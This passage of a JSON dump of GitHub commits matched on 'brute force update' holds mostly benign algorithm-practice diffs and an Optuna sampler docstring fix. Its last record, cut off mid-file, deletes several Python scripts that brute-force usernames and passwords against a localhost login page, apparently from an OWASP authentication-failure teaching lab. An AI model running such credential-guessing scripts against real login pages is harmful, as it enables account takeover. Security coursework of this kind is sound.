j in arr:\n        # \ud29c\ud50c \uc778\ub371\uc2f1 = x\ub294 x\ub07c\ub9ac y\ub294 y\ub07c\ub9ac \ube44\uad50 \/ \uc870\uac74 \ub9cc\uc871\ud558\uba74 +1\n        if i[0] < j[0] and i[1] < j[1]:\n            rank += 1\n    print(rank)\n       "}},"msg":"0823 brute_force update"}},"https:\/\/github.com\/himkt\/optuna-pyprojecttoml":{"a1f2150db46d2c2d531d90f413b5c6869f401701":{"url":"https:\/\/api.github.com\/repos\/himkt\/optuna-pyprojecttoml\/commits\/a1f2150db46d2c2d531d90f413b5c6869f401701","html_url":"https:\/\/github.com\/himkt\/optuna-pyprojecttoml\/commit\/a1f2150db46d2c2d531d90f413b5c6869f401701","message":"Update optuna\/samplers\/_brute_force.py\n\nCo-authored-by: Toshihiko Yanase <toshihiko.yanase@gmail.com>","sha":"a1f2150db46d2c2d531d90f413b5c6869f401701","keyword":"brute force update","diff":"diff --git a\/optuna\/samplers\/_brute_force.py b\/optuna\/samplers\/_brute_force.py\nindex 14947e0a7..d544cd4e7 100644\n--- a\/optuna\/samplers\/_brute_force.py\n+++ b\/optuna\/samplers\/_brute_force.py\n@@ -32,7 +32,7 @@ class BruteForceSampler(BaseSampler):\n         For example, the sampler may fail to try the entire search space in the following cases.\n \n         * Using with other samplers or :meth:`~optuna.study.Study.enqueue_trial`\n-        * Changing suggestions range or adding parameters in the same :class:`~optuna.study.Study`\n+        * Changing suggestion ranges or adding parameters in the same :class:`~optuna.study.Study`\n \n     Args:\n         seed:\n","files":{"\/optuna\/samplers\/_brute_force.py":{"changes":[{"diff":"\n         For example, the sampler may fail to try the entire search space in the following cases.\n \n         * Using with other samplers or :meth:`~optuna.study.Study.enqueue_trial`\n-        * Changing suggestions range or adding parameters in the same :class:`~optuna.study.Study`\n+        * Changing suggestion ranges or adding parameters in the same :class:`~optuna.study.Study`\n \n     Args:\n         seed:\n","add":1,"remove":1,"filename":"\/optuna\/samplers\/_brute_force.py","badparts":["        * Changing suggestions range or adding parameters in the same :class:`~optuna.study.Study`"],"goodparts":["        * Changing suggestion ranges or adding parameters in the same :class:`~optuna.study.Study`"]}],"source":"\nimport decimal from typing import Any from typing import Dict from typing import Optional from typing import Sequence import numpy as np from optuna._experimental import experimental_class from optuna.distributions import BaseDistribution from optuna.distributions import CategoricalDistribution from optuna.distributions import FloatDistribution from optuna.distributions import IntDistribution from optuna.samplers import BaseSampler from optuna.study import Study from optuna.trial import FrozenTrial from optuna.trial import TrialState @experimental_class(\"3.1.0\") class BruteForceSampler(BaseSampler): \"\"\"Sampler using brute force. This sampler performs exhaustive search on the defined search space. Note: The defined search space must be finite. Therefore, when using :class:`~optuna.distributions.FloatDistibution`, ``step=None`` is not allowed. Note: This sampler assumes that it suggests all parameters and that the search space is fixed. For example, the sampler may fail to try the entire search space in the following cases. * Using with other samplers or:meth:`~optuna.study.Study.enqueue_trial` * Changing suggestions range or adding parameters in the same:class:`~optuna.study.Study` Args: seed: A seed to fix the order of trials as the search order randomly shuffled. Please note that it is not recommended using this option in distributed optimization settings since this option cannot ensure the order of trials and may increase the number of duplicate suggestions during distributed optimization. \"\"\" def __init__(self, seed: Optional[int]=None) -> None: self._rng=np.random.RandomState(seed) def infer_relative_search_space( self, study: Study, trial: FrozenTrial ) -> Dict[str, BaseDistribution]: return{} def sample_relative( self, study: Study, trial: FrozenTrial, search_space: Dict[str, BaseDistribution] ) -> Dict[str, Any]: return{} def sample_independent( self, study: Study, trial: FrozenTrial, param_name: str, param_distribution: BaseDistribution, ) -> Any: candidates=_enumerate_candidates(param_distribution) assert len(candidates) > 0 self._rng.shuffle(candidates) for value in candidates[1:]: params=trial.params.copy() params[param_name]=value study.enqueue_trial(params, skip_if_exists=True) return candidates[0] def after_trial( self, study: Study, trial: FrozenTrial, state: TrialState, values: Optional[Sequence[float]], ) -> None: if len(study.get_trials(deepcopy=False, states=(TrialState.WAITING,)))==0: study.stop() def _enumerate_candidates(param_distribution: BaseDistribution) -> Sequence[Any]: if isinstance(param_distribution, FloatDistribution): if param_distribution.step is None: raise ValueError( \"FloatDistribution.step must be given for BruteForceSampler\" \"(otherwise, the search space will be infinite).\" ) low=decimal.Decimal(str(param_distribution.low)) high=decimal.Decimal(str(param_distribution.high)) step=decimal.Decimal(str(param_distribution.step)) ret=[] value=low while value <=high: ret.append(float(value)) value +=step return ret elif isinstance(param_distribution, IntDistribution): return list( range(param_distribution.low, param_distribution.high +1, param_distribution.step) ) elif isinstance(param_distribution, CategoricalDistribution): return list(param_distribution.choices) else: raise ValueError(f\"Unknown distribution{param_distribution}.\") ","sourceWithComments":"import decimal\nfrom typing import Any\nfrom typing import Dict\nfrom typing import Optional\nfrom typing import Sequence\n\nimport numpy as np\n\nfrom optuna._experimental import experimental_class\nfrom optuna.distributions import BaseDistribution\nfrom optuna.distributions import CategoricalDistribution\nfrom optuna.distributions import FloatDistribution\nfrom optuna.distributions import IntDistribution\nfrom optuna.samplers import BaseSampler\nfrom optuna.study import Study\nfrom optuna.trial import FrozenTrial\nfrom optuna.trial import TrialState\n\n\n@experimental_class(\"3.1.0\")\nclass BruteForceSampler(BaseSampler):\n    \"\"\"Sampler using brute force.\n\n    This sampler performs exhaustive search on the defined search space.\n\n    Note:\n        The defined search space must be finite. Therefore, when using\n        :class:`~optuna.distributions.FloatDistibution`, ``step=None`` is not allowed.\n\n    Note:\n        This sampler assumes that it suggests all parameters and that the search space is fixed.\n        For example, the sampler may fail to try the entire search space in the following cases.\n\n        * Using with other samplers or :meth:`~optuna.study.Study.enqueue_trial`\n        * Changing suggestions range or adding parameters in the same :class:`~optuna.study.Study`\n\n    Args:\n        seed:\n            A seed to fix the order of trials as the search order randomly shuffled. Please note\n            that it is not recommended using this option in distributed optimization settings since\n            this option cannot ensure the order of trials and may increase the number of duplicate\n            suggestions during distributed optimization.\n    \"\"\"\n\n    def __init__(self, seed: Optional[int] = None) -> None:\n        self._rng = np.random.RandomState(seed)\n\n    def infer_relative_search_space(\n        self, study: Study, trial: FrozenTrial\n    ) -> Dict[str, BaseDistribution]:\n        return {}\n\n    def sample_relative(\n        self, study: Study, trial: FrozenTrial, search_space: Dict[str, BaseDistribution]\n    ) -> Dict[str, Any]:\n        return {}\n\n    def sample_independent(\n        self,\n        study: Study,\n        trial: FrozenTrial,\n        param_name: str,\n        param_distribution: BaseDistribution,\n    ) -> Any:\n        candidates = _enumerate_candidates(param_distribution)\n        assert len(candidates) > 0\n\n        self._rng.shuffle(candidates)\n\n        for value in candidates[1:]:\n            params = trial.params.copy()\n            params[param_name] = value\n            study.enqueue_trial(params, skip_if_exists=True)\n\n        return candidates[0]\n\n    def after_trial(\n        self,\n        study: Study,\n        trial: FrozenTrial,\n        state: TrialState,\n        values: Optional[Sequence[float]],\n    ) -> None:\n        if len(study.get_trials(deepcopy=False, states=(TrialState.WAITING,))) == 0:\n            study.stop()\n\n\ndef _enumerate_candidates(param_distribution: BaseDistribution) -> Sequence[Any]:\n    if isinstance(param_distribution, FloatDistribution):\n        if param_distribution.step is None:\n            raise ValueError(\n                \"FloatDistribution.step must be given for BruteForceSampler\"\n                \" (otherwise, the search space will be infinite).\"\n            )\n        low = decimal.Decimal(str(param_distribution.low))\n        high = decimal.Decimal(str(param_distribution.high))\n        step = decimal.Decimal(str(param_distribution.step))\n\n        ret = []\n        value = low\n        while value <= high:\n            ret.append(float(value))\n            value += step\n\n        return ret\n    elif isinstance(param_distribution, IntDistribution):\n        return list(\n            range(param_distribution.low, param_distribution.high + 1, param_distribution.step)\n        )\n    elif isinstance(param_distribution, CategoricalDistribution):\n        return list(param_distribution.choices)\n    else:\n        raise ValueError(f\"Unknown distribution {param_distribution}.\")\n"}},"msg":"Update optuna\/samplers\/_brute_force.py\n\nCo-authored-by: Toshihiko Yanase <toshihiko.yanase@gmail.com>"}},"https:\/\/github.com\/matzolla\/LeetCode":{"53bc9dfb7c66c74acf6d988e06c3cae4ca14344c":{"url":"https:\/\/api.github.com\/repos\/matzolla\/LeetCode\/commits\/53bc9dfb7c66c74acf6d988e06c3cae4ca14344c","html_url":"https:\/\/github.com\/matzolla\/LeetCode\/commit\/53bc9dfb7c66c74acf6d988e06c3cae4ca14344c","message":"Update group_anagram_brute_force.py","sha":"53bc9dfb7c66c74acf6d988e06c3cae4ca14344c","keyword":"brute force update","diff":"diff --git a\/Solutions\/group_anagram_brute_force.py b\/Solutions\/group_anagram_brute_force.py\nindex b16c9a2..d7b7ada 100644\n--- a\/Solutions\/group_anagram_brute_force.py\n+++ b\/Solutions\/group_anagram_brute_force.py\n@@ -9,48 +9,6 @@\n Output: [[\"bat\"],[\"nat\",\"tan\"],[\"ate\",\"eat\",\"tea\"]]\n \n \"\"\"\n-class Solution(object):\n-    def groupAnagrams(self, strs):\n-        \"\"\"\n-        :type strs: List[str]\n-        :rtype: List[List[str]]\n-        \"\"\"\n-        if len(strs)==0:\n-            return [[\"\"]]\n-        empty=[]\n-        not_empty=[]\n-        for str_ in strs:\n-            if str_ ==\"\":\n-                empty.append(str_)\n-            else:\n-                not_empty.append(str_)\n-        \n-        letters=[\"\",\"a\",\"b\",\"c\",\"d\",\"e\",\"f\",\"g\",\"h\",\"i\",\"j\",\"k\",\n-                \"l\",\"m\",\"n\",\"o\",\"p\",\"q\",\"r\",\"s\",\"t\",\"u\",\"v\",\"w\",\"x\",\"y\",\"z\"]\n-        embed=dict()\n-        anagram=dict()\n-        result=[]\n-        ########\n-        for words in not_empty:\n-            value=0\n-            for letter in words:\n-                value+=letters.index(letter)\n-            embed[words]=value\n-        #######\n-        val=set(embed.values())\n-        \n-        for values in val:\n-            anagram[str(values)]=[element for element in embed.keys() if embed[element]==values]\n-            \n-        for keys in anagram.keys():\n-            result.append(anagram[keys])\n-        if len(not_empty)!=0 and len(empty)!=0:\n-            return [empty]+result\n-        if len(not_empty)==0 and len(empty)!=0:\n-            return [empty]\n-        if len(empty)==0 and len(not_empty)!=0:\n-            return result\n-\n ### really brute-force approach time complexity ~0(n^2)\n ## space complexity O(len(result)) with some auxillary space complexity\n \n@@ -70,4 +28,4 @@ def groupAnagrams(self, strs):\n         return anagrams.values()\n \n \n-## time complexity O(nm.log(n))  i think the sorting has an impact on the algorithm\n\\ No newline at end of file\n+## time complexity O(nm.log(n))  i think the sorting has an impact on the algorithm\n","files":{"\/Solutions\/group_anagram_brute_force.py":{"changes":[{"diff":"\n Output: [[\"bat\"],[\"nat\",\"tan\"],[\"ate\",\"eat\",\"tea\"]]\n \n \"\"\"\n-class Solution(object):\n-    def groupAnagrams(self, strs):\n-        \"\"\"\n-        :type strs: List[str]\n-        :rtype: List[List[str]]\n-        \"\"\"\n-        if len(strs)==0:\n-            return [[\"\"]]\n-        empty=[]\n-        not_empty=[]\n-        for str_ in strs:\n-            if str_ ==\"\":\n-                empty.append(str_)\n-            else:\n-                not_empty.append(str_)\n-        \n-        letters=[\"\",\"a\",\"b\",\"c\",\"d\",\"e\",\"f\",\"g\",\"h\",\"i\",\"j\",\"k\",\n-                \"l\",\"m\",\"n\",\"o\",\"p\",\"q\",\"r\",\"s\",\"t\",\"u\",\"v\",\"w\",\"x\",\"y\",\"z\"]\n-        embed=dict()\n-        anagram=dict()\n-        result=[]\n-        ########\n-        for words in not_empty:\n-            value=0\n-            for letter in words:\n-                value+=letters.index(letter)\n-            embed[words]=value\n-        #######\n-        val=set(embed.values())\n-        \n-        for values in val:\n-            anagram[str(values)]=[element for element in embed.keys() if embed[element]==values]\n-            \n-        for keys in anagram.keys():\n-            result.append(anagram[keys])\n-        if len(not_empty)!=0 and len(empty)!=0:\n-            return [empty]+result\n-        if len(not_empty)==0 and len(empty)!=0:\n-            return [empty]\n-        if len(empty)==0 and len(not_empty)!=0:\n-            return result\n-\n ### really brute-force approach time complexity ~0(n^2)\n ## space complexity O(len(result)) with some auxillary space complexity\n \n","add":0,"remove":42,"filename":"\/Solutions\/group_anagram_brute_force.py","badparts":["class Solution(object):","    def groupAnagrams(self, strs):","        \"\"\"","        :type strs: List[str]","        :rtype: List[List[str]]","        \"\"\"","        if len(strs)==0:","            return [[\"\"]]","        empty=[]","        not_empty=[]","        for str_ in strs:","            if str_ ==\"\":","                empty.append(str_)","            else:","                not_empty.append(str_)","        letters=[\"\",\"a\",\"b\",\"c\",\"d\",\"e\",\"f\",\"g\",\"h\",\"i\",\"j\",\"k\",","                \"l\",\"m\",\"n\",\"o\",\"p\",\"q\",\"r\",\"s\",\"t\",\"u\",\"v\",\"w\",\"x\",\"y\",\"z\"]","        embed=dict()","        anagram=dict()","        result=[]","        for words in not_empty:","            value=0","            for letter in words:","                value+=letters.index(letter)","            embed[words]=value","        val=set(embed.values())","        for values in val:","            anagram[str(values)]=[element for element in embed.keys() if embed[element]==values]","        for keys in anagram.keys():","            result.append(anagram[keys])","        if len(not_empty)!=0 and len(empty)!=0:","            return [empty]+result","        if len(not_empty)==0 and len(empty)!=0:","            return [empty]","        if len(empty)==0 and len(not_empty)!=0:","            return result"],"goodparts":[]}],"source":"\n\"\"\" Given an array of strings strs, group the anagrams together. You can return the answer in any order. An Anagram is a word or phrase formed by rearranging the letters of a different word or phrase, typically using all the original letters exactly once. Example: Input: strs=[\"eat\",\"tea\",\"tan\",\"ate\",\"nat\",\"bat\"] Output:[[\"bat\"],[\"nat\",\"tan\"],[\"ate\",\"eat\",\"tea\"]] \"\"\" class Solution(object): def groupAnagrams(self, strs): \"\"\" :type strs: List[str] :rtype: List[List[str]] \"\"\" if len(strs)==0: return[[\"\"]] empty=[] not_empty=[] for str_ in strs: if str_==\"\": empty.append(str_) else: not_empty.append(str_) letters=[\"\",\"a\",\"b\",\"c\",\"d\",\"e\",\"f\",\"g\",\"h\",\"i\",\"j\",\"k\", \"l\",\"m\",\"n\",\"o\",\"p\",\"q\",\"r\",\"s\",\"t\",\"u\",\"v\",\"w\",\"x\",\"y\",\"z\"] embed=dict() anagram=dict() result=[] for words in not_empty: value=0 for letter in words: value+=letters.index(letter) embed[words]=value val=set(embed.values()) for values in val: anagram[str(values)]=[element for element in embed.keys() if embed[element]==values] for keys in anagram.keys(): result.append(anagram[keys]) if len(not_empty)!=0 and len(empty)!=0: return[empty]+result if len(not_empty)==0 and len(empty)!=0: return[empty] if len(empty)==0 and len(not_empty)!=0: return result class Solution(object): def groupAnagrams(self, strs): \"\"\" :type strs: List[str] :rtype: List[List[str]] \"\"\" anagrams=collections.defaultdict(list) for str_ in strs: anagrams[tuple(sorted(str_))].append(str_) return anagrams.values() ","sourceWithComments":"\"\"\"\nGiven an array of strings strs, group the anagrams together. You can return the answer in any order.\n\nAn Anagram is a word or phrase formed by rearranging the letters of a different word or phrase, \ntypically using all the original letters exactly once.\n\nExample:\nInput: strs = [\"eat\",\"tea\",\"tan\",\"ate\",\"nat\",\"bat\"]\nOutput: [[\"bat\"],[\"nat\",\"tan\"],[\"ate\",\"eat\",\"tea\"]]\n\n\"\"\"\nclass Solution(object):\n    def groupAnagrams(self, strs):\n        \"\"\"\n        :type strs: List[str]\n        :rtype: List[List[str]]\n        \"\"\"\n        if len(strs)==0:\n            return [[\"\"]]\n        empty=[]\n        not_empty=[]\n        for str_ in strs:\n            if str_ ==\"\":\n                empty.append(str_)\n            else:\n                not_empty.append(str_)\n        \n        letters=[\"\",\"a\",\"b\",\"c\",\"d\",\"e\",\"f\",\"g\",\"h\",\"i\",\"j\",\"k\",\n                \"l\",\"m\",\"n\",\"o\",\"p\",\"q\",\"r\",\"s\",\"t\",\"u\",\"v\",\"w\",\"x\",\"y\",\"z\"]\n        embed=dict()\n        anagram=dict()\n        result=[]\n        ########\n        for words in not_empty:\n            value=0\n            for letter in words:\n                value+=letters.index(letter)\n            embed[words]=value\n        #######\n        val=set(embed.values())\n        \n        for values in val:\n            anagram[str(values)]=[element for element in embed.keys() if embed[element]==values]\n            \n        for keys in anagram.keys():\n            result.append(anagram[keys])\n        if len(not_empty)!=0 and len(empty)!=0:\n            return [empty]+result\n        if len(not_empty)==0 and len(empty)!=0:\n            return [empty]\n        if len(empty)==0 and len(not_empty)!=0:\n            return result\n\n### really brute-force approach time complexity ~0(n^2)\n## space complexity O(len(result)) with some auxillary space complexity\n\nclass Solution(object):\n    def groupAnagrams(self, strs):\n        \"\"\"\n        :type strs: List[str]\n        :rtype: List[List[str]]\n        \"\"\"\n        \n        anagrams=collections.defaultdict(list)\n        \n        for str_ in strs:\n            \n            anagrams[tuple(sorted(str_))].append(str_)\n            \n        return anagrams.values()\n\n\n## time complexity O(nm.log(n))  i think the sorting has an impact on the algorithm"}},"msg":"Update group_anagram_brute_force.py"}},"https:\/\/github.com\/Jobyeongjin\/Algorithms":{"72f77645326bb4a31b7f3d342c7927256fb54950":{"url":"https:\/\/api.github.com\/repos\/Jobyeongjin\/Algorithms\/commits\/72f77645326bb4a31b7f3d342c7927256fb54950","html_url":"https:\/\/github.com\/Jobyeongjin\/Algorithms\/commit\/72f77645326bb4a31b7f3d342c7927256fb54950","message":"Update bj-brute_force","sha":"72f77645326bb4a31b7f3d342c7927256fb54950","keyword":"brute force update","diff":"diff --git a\/baekjoon\/brute-force.py b\/baekjoon\/brute-force.py\nindex 150370b..fb1230a 100644\n--- a\/baekjoon\/brute-force.py\n+++ b\/baekjoon\/brute-force.py\n@@ -85,10 +85,10 @@\n \n N = int(input())\n \n-TITLE = 666  # \ubb38\uc790\ud615\uc73c\ub85c \uc785\ub825\n+TITLE = 666\n cnt = 0\n-while True:  # 666\ubd80\ud130 \ubb34\ud55c \ubc18\ubcf5\n-    if '666' in str(TITLE):  # \ubb38\uc790\ud615 \ubc18\ubcf5\ubb38\uc5d0\uc11c '666' \uc774 \ub098\uc628\ub2e4\uba74 \uce74\uc6b4\ud305\n+while True:\n+    if '666' in str(TITLE):  # \ubb38\uc790\ud615 \ud0c0\uc774\ud2c0\uc5d0\uc11c '666' \uc774 \ub098\uc628\ub2e4\uba74 \uce74\uc6b4\ud305\n         cnt += 1\n \n     if cnt == N:  # \uce74\uc6b4\ud305\uc774 N\ub9cc\ud07c \ub098\uc654\ub2e4\uba74 \ucd9c\ub825\ud558\uace0 \uc885\ub8cc\n","files":{"\/baekjoon\/brute-force.py":{"changes":[{"diff":"\n \n N = int(input())\n \n-TITLE = 666  # \ubb38\uc790\ud615\uc73c\ub85c \uc785\ub825\n+TITLE = 666\n cnt = 0\n-while True:  # 666\ubd80\ud130 \ubb34\ud55c \ubc18\ubcf5\n-    if '666' in str(TITLE):  # \ubb38\uc790\ud615 \ubc18\ubcf5\ubb38\uc5d0\uc11c '666' \uc774 \ub098\uc628\ub2e4\uba74 \uce74\uc6b4\ud305\n+while True:\n+    if '666' in str(TITLE):  # \ubb38\uc790\ud615 \ud0c0\uc774\ud2c0\uc5d0\uc11c '666' \uc774 \ub098\uc628\ub2e4\uba74 \uce74\uc6b4\ud305\n         cnt += 1\n \n     if cnt == N:  # \uce74\uc6b4\ud305\uc774 N\ub9cc\ud07c \ub098\uc654\ub2e4\uba74 \ucd9c\ub825\ud558\uace0 \uc885\ub8cc\n","add":3,"remove":3,"filename":"\/baekjoon\/brute-force.py","badparts":["TITLE = 666  # \ubb38\uc790\ud615\uc73c\ub85c \uc785\ub825","while True:  # 666\ubd80\ud130 \ubb34\ud55c \ubc18\ubcf5","    if '666' in str(TITLE):  # \ubb38\uc790\ud615 \ubc18\ubcf5\ubb38\uc5d0\uc11c '666' \uc774 \ub098\uc628\ub2e4\uba74 \uce74\uc6b4\ud305"],"goodparts":["TITLE = 666","while True:","    if '666' in str(TITLE):  # \ubb38\uc790\ud615 \ud0c0\uc774\ud2c0\uc5d0\uc11c '666' \uc774 \ub098\uc628\ub2e4\uba74 \uce74\uc6b4\ud305"]}],"source":"\nimport sys input=sys.stdin.readline '''\ube14\ub799\uc7ad \ud83d\udc33''' N, M=map(int, input().split()) CARD=list(map(int, input().split())) answer=0 for i in range(N -2): for j in range(i +1, N -1): for k in range(j +1, N): total=CARD[i] +CARD[j] +CARD[k] if answer < total <=M: answer=total if total==M: answer=total print(answer) '''\ubd84\ud574\ud569 \ud83d\udc33''' N=int(input()) answer=0 for i in range(1, N +1): LIST=list(map(int, str(i))) SUM=i +sum(LIST) if SUM==N: answer=i break print(answer) '''\ub369\uce58 \ud83d\udc33''' N=int(input()) PEOPLE=[list(map(int, input().split())) for _ in range(N)] for i in PEOPLE: RANK=1 for j in PEOPLE: if i[0] < j[0] and i[1] < j[1]: RANK +=1 print(RANK, end=' ') '''\uccb4\uc2a4\ud310 \ub2e4\uc2dc \uce60\ud558\uae30 \ud83d\udc33 \ud83d\udea8''' N, M=map(int, input().split()) CHESS=[input().strip() for _ in range(N)] cnt=[] for a in range(N -7): for b in range(M -7): W=0 B=0 for i in range(a, a +8): for j in range(b, b +8): if(i +j) % 2==0: if CHESS[i][j] !='W': W +=1 if CHESS[i][j] !='B': B +=1 else: if CHESS[i][j] !='B': W +=1 if CHESS[i][j] !='W': B +=1 cnt.append(min(W, B)) print(min(cnt)) '''\uc601\ud654\uac10\ub3c5 \uc20c \ud83d\udc33''' N=int(input()) TITLE=666 cnt=0 while True: if '666' in str(TITLE): cnt +=1 if cnt==N: print(TITLE) break TITLE +=1 ","sourceWithComments":"import sys\n\ninput = sys.stdin.readline\n\n'''\ube14\ub799\uc7ad \ud83d\udc33'''\n\nN, M = map(int, input().split())\nCARD = list(map(int, input().split()))\n\nanswer = 0\nfor i in range(N - 2):  # \uc778\ub371\uc2a4\ub97c \ub118\uc9c0\uc54a\uac8c 3\uc911 \ubc18\ubcf5\ubb38 \uc0dd\uc131\n    for j in range(i + 1, N - 1):\n        for k in range(j + 1, N):\n            total = CARD[i] + CARD[j] + CARD[k]  # \uce74\ub4dc 3\uc7a5\uc758 \ud569\n\n            if answer < total <= M:  # M\uc744 \ub118\uc9c0\uc54a\uc73c\uba74\uc11c \uac00\uae4c\uc6b4 \uc218\ub85c \uc800\uc7a5\n                answer = total\n            if total == M:\n                answer = total\n\nprint(answer)\n\n\n'''\ubd84\ud574\ud569 \ud83d\udc33'''\n\nN = int(input())\n\nanswer = 0\nfor i in range(1, N + 1):  # 1\ubd80\ud130 N\uae4c\uc9c0 \ubc18\ubcf5\ud55c \uc815\uc218\n    LIST = list(map(int, str(i)))  # \ubb38\uc790\ud615\uc73c\ub85c \ub098\ub204\uace0 \ub2e4\uc2dc \uc22b\uc790\ud615 \ub9ac\uc2a4\ud2b8\ub85c \uc785\ub825\n    SUM = i + sum(LIST)  # \ubd84\ud574\ud569\n\n    if SUM == N:\n        answer = i\n        break\n\nprint(answer)\n\n\n'''\ub369\uce58 \ud83d\udc33'''\n\nN = int(input())\n\nPEOPLE = [list(map(int, input().split())) for _ in range(N)]  # \uc774\ucc28\uc6d0 \ub9ac\uc2a4\ud2b8\ub85c \uc785\ub825\n\nfor i in PEOPLE:  # \uc644\uc804 \ud0d0\uc0c9\uc73c\ub85c \ub9ac\uc2a4\ud2b8 \uc21c\ud68c\n    RANK = 1  # \uae30\ubcf8\uac12\n    for j in PEOPLE:\n        if i[0] < j[0] and i[1] < j[1]:  # \ub2e4\uc74c \ub9ac\uc2a4\ud2b8 \uac12\uc774 \ub354 \ud06c\ub2e4\uba74 RAMK + 1\n            RANK += 1\n\n    print(RANK, end=' ')\n\n\n'''\uccb4\uc2a4\ud310 \ub2e4\uc2dc \uce60\ud558\uae30 \ud83d\udc33 \ud83d\udea8'''\n\nN, M = map(int, input().split())\n\nCHESS = [input().strip() for _ in range(N)]\n\ncnt = []\nfor a in range(N - 7):  # \uc644\uc804 \ud0d0\uc0c9, 8 * 8 \ud06c\uae30\uc758 \uccb4\uc2a4\ud310\n    for b in range(M - 7):\n        W = 0  # W, B\ub85c \uc2dc\uc791\ud558\ub294 \uacbd\uc6b0 \ubc14\ub010 \uccb4\uc2a4\ud310\uc744 \uce74\uc6b4\ud305\n        B = 0\n        for i in range(a, a + 8):  # \uc2dc\uc791, \ub05d\uc810\uc744 \uac00\ub9ac\ud0a4\ub294 \uc774\uc911 \ubc18\ubcf5\ubb38\n            for j in range(b, b + 8):\n                if (i + j) % 2 == 0:  # \uc9dd\uc218\uc778 \uacbd\uc6b0 \uccab\ubc88\uc9f8 \uac12\uacfc \ub3d9\uc77c\ud574\uc57c \ud55c\ub2e4\ud83d\udca1\n                    if CHESS[i][j] != 'W':  # \ud770\uc0c9\uc774 \uc544\ub2c8\ub77c\uba74 \ud770\uc0c9\uc73c\ub85c \uce74\uc6b4\ud305\n                        W += 1\n                    if CHESS[i][j] != 'B':\n                        B += 1\n                else:  # \ud640\uc218\uc778 \uacbd\uc6b0 \uccab\ubc88\uc9f8 \uac12\uacfc \ub2ec\ub77c\uc57c \ud55c\ub2e4\ud83d\udca1\n                    if CHESS[i][j] != 'B':\n                        W += 1\n                    if CHESS[i][j] != 'W':\n                        B += 1\n\n        cnt.append(min(W, B))\n\nprint(min(cnt))\n\n\n'''\uc601\ud654\uac10\ub3c5 \uc20c \ud83d\udc33'''\n\nN = int(input())\n\nTITLE = 666  # \ubb38\uc790\ud615\uc73c\ub85c \uc785\ub825\ncnt = 0\nwhile True:  # 666\ubd80\ud130 \ubb34\ud55c \ubc18\ubcf5\n    if '666' in str(TITLE):  # \ubb38\uc790\ud615 \ubc18\ubcf5\ubb38\uc5d0\uc11c '666' \uc774 \ub098\uc628\ub2e4\uba74 \uce74\uc6b4\ud305\n        cnt += 1\n\n    if cnt == N:  # \uce74\uc6b4\ud305\uc774 N\ub9cc\ud07c \ub098\uc654\ub2e4\uba74 \ucd9c\ub825\ud558\uace0 \uc885\ub8cc\n        print(TITLE)\n        break\n\n    TITLE += 1  # 1\uc529 \uc99d\uac00\n"}},"msg":"Update bj-brute_force"}},"https:\/\/github.com\/jamesmong96\/CS-M20":{"a46f17128a4db02c02dd4bb759b0a1c85dc4269b":{"url":"https:\/\/api.github.com\/repos\/jamesmong96\/CS-M20\/commits\/a46f17128a4db02c02dd4bb759b0a1c85dc4269b","html_url":"https:\/\/github.com\/jamesmong96\/CS-M20\/commit\/a46f17128a4db02c02dd4bb759b0a1c85dc4269b","message":"update brute force script","sha":"a46f17128a4db02c02dd4bb759b0a1c85dc4269b","keyword":"brute force update","diff":"diff --git a\/helper\/A07_brute_force_scripts\/loop1_pass.py b\/helper\/A07_brute_force_scripts\/loop1_pass.py\ndeleted file mode 100644\nindex 63d26b3..0000000\n--- a\/helper\/A07_brute_force_scripts\/loop1_pass.py\n+++ \/dev\/null\n@@ -1,7 +0,0 @@\n-import requests\n-characters = [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\n-for a in characters:\n-  temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': '5d', 'password': a})\n-  if \"Incorrect password\" not in temp.text:\n-    print('Possible password: '+a)\n-    exit()\n\\ No newline at end of file\ndiff --git a\/helper\/A07_brute_force_scripts\/loop1_user.py b\/helper\/A07_brute_force_scripts\/loop1_user.py\ndeleted file mode 100644\nindex 0402e0d..0000000\n--- a\/helper\/A07_brute_force_scripts\/loop1_user.py\n+++ \/dev\/null\n@@ -1,6 +0,0 @@\n-import requests\n-characters = [\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"m\", \"n\", \"o\", \"p\", \"q\", \"r\", \"s\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\", \"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\n-for a in characters:\n-  temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': a, 'password': '123'})\n-  if \"User doesn't exist\" not in temp.text:\n-    print('Possible username: '+a)\ndiff --git a\/helper\/A07_brute_force_scripts\/loop2_pass.py b\/helper\/A07_brute_force_scripts\/loop2_pass.py\ndeleted file mode 100644\nindex d5ca567..0000000\n--- a\/helper\/A07_brute_force_scripts\/loop2_pass.py\n+++ \/dev\/null\n@@ -1,8 +0,0 @@\n-import requests\n-characters = [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\n-for a in characters:\n-  for b in characters:\n-    temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': '5d', 'password': a+b})\n-    if \"Incorrect password\" not in temp.text:\n-      print('Possible password: '+a+b)\n-      exit()\n\\ No newline at end of file\ndiff --git a\/helper\/A07_brute_force_scripts\/loop2_user.py b\/helper\/A07_brute_force_scripts\/loop2_user.py\ndeleted file mode 100644\nindex 0c51bca..0000000\n--- a\/helper\/A07_brute_force_scripts\/loop2_user.py\n+++ \/dev\/null\n@@ -1,7 +0,0 @@\n-import requests\n-characters = [\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"m\", \"n\", \"o\", \"p\", \"q\", \"r\", \"s\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\", \"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\n-for a in characters:\n-  for b in characters:\n-    temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': a+b, 'password': '123'})\n-    if \"User doesn't exist\" not in temp.text:\n-      print('Possible username: '+a+b)\ndiff --git a\/helper\/A07_brute_force_scripts\/loop3_pass.py b\/helper\/A07_brute_force_scripts\/loop3_pass.py\ndeleted file mode 100644\nindex a427caf..0000000\n--- a\/helper\/A07_brute_force_scripts\/loop3_pass.py\n+++ \/dev\/null\n@@ -1,9 +0,0 @@\n-import requests\n-characters = [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", 